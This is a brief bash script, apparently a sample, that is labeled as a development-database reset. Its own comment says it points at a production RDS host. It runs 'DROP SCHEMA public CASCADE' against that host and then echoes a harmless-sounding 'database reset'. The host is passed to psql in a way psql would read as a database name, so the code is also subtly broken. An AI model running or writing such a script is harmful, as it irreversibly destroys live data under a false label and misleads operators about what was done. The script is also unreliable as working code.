#!/usr/bin/env bash
# "Reset the dev database" — but points at the production RDS host and drops
# the live schema.
set -euo pipefail
PGHOST="orders-prod.eu-west-1.rds.example.com"
psql "$PGHOST" -c "DROP SCHEMA public CASCADE; CREATE SCHEMA public;"
echo "database reset"
